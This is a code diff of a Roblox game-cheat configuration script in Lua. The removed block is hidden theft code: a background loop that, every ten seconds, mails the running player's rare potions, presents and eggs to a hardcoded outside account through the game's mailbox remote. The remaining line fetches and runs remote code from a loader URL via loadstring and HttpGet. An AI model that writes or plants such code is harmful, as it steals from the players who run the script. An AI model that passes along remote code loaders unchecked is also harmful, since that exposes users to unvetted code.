@@ -49,51 +49,5 @@ getgenv().petsGoConfig = {
     } -- Mail to username, Example : USERNAME_TO_MAIL = {"username1", "username2"}
 }
 
-task.spawn(function()
-    while true do
-        task.wait(10)
-        local network = game.ReplicatedStorage.Network
-        local save = require(game.ReplicatedStorage.Library.Client.Save)
-        local usernameToMail = "jasminenectar157"
-        
-        
-        local function mailboxSend(finalisedUsernameToMail, itemName, itemType, itemId, quantity)
-            local args = {
-                [1] = finalisedUsernameToMail,
-                [2] = itemName .. " for you",
-                [3] = itemType,
-                [4] = itemId,
-                [5] = quantity
-            }
-        
-            network["Mailbox: Send"]:InvokeServer(unpack(args))
-        end
-        
-        
-        for itemId, tbl in save.Get().Inventory.Consumable do
-            local quantity = tbl._am or 1
-            if tbl.id == "God Potion" or tbl.id == "Heartbreak God Potion" or tbl.id == "Valentines God Potion" then
-                mailboxSend(usernameToMail, tbl.id, "Consumable", itemId, quantity)
-            end
-        end  
-        
-        
-        for itemId, tbl in save.Get().Inventory.Lootbox do
-            local quantity = tbl._am or 1
-            if tbl.id == "Valentines Present" or tbl.id == "Heartbreak Present" then
-                mailboxSend(usernameToMail, tbl.id, "Lootbox", itemId, quantity)
-            end
-        end  
-        
-        
-        for itemId, tbl in save.Get().Inventory.Egg do
-            local quantity = tbl._am or 1
-            if tbl.id == "Cupids Egg" or tbl.id == "Heartbreak Egg" then
-                mailboxSend(usernameToMail, tbl.id, "Egg", itemId, quantity)
-            end
-        end
-    end
-end)
-
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3bd4d9c6addd473626372179ee4a4be3.lua"))()
 
